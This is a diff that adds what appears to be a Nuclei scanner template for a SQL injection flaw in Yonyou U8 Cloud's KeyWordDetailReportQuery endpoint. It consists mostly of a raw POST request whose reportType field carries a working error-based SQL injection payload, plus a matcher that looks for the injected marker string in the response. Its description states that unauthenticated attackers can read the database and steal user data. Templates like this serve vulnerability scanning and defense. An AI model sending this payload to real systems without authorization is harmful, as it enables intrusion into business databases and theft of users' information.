@@ -1,0 +1,52 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - \u0027qkzkq
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101
+    Firefox/124.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cache: no-cache
+
+    Content-Length: 315
+
+    Origin: moz-extension://3d20215c-7bdd-427f-89ad-ca555361bd21
+
+    Connection: close
+
+    Cookie: JSESSIONID=8BBE115151BF3762C8892718D0EA3A0A.server
+
+
+    {"reportType":"1'' AND 6886 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(107)+CHAR(113)+(SELECT
+    (CASE WHEN (6886=6886) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(122)+CHAR(113)))
+    AND ''xtgM''=''xtgM","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}'
+id: yongyou-u8-KeyWordDetailReportQuery-sql-Injection
+info:
+  author: yyj
+  description: "\u7528\u53CBU8 cloud KeyWordDetailReportQuery \u63A5\u53E3\u5904\u5B58\
+    \u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u672A\u7ECF\u6388\u6743\
+    \u53EF\u4EE5\u8BBF\u95EE\u6570\u636E\u5E93\u4E2D\u7684\u6570\u636E\uFF0C\u4ECE\
+    \u800C\u76D7\u53D6\u7528\u6237\u6570\u636E\uFF0C\u9020\u6210\u7528\u6237\u4FE1\
+    \u606F\u6CC4\u9732\u3002"
+  name: "\u7528\u53CBU8 cloud KeyWordDetailReportQuery SQL\u6CE8\u5165\u6F0F\u6D1E"
+  reference: null
+  severity: critical
+  tags: sqli
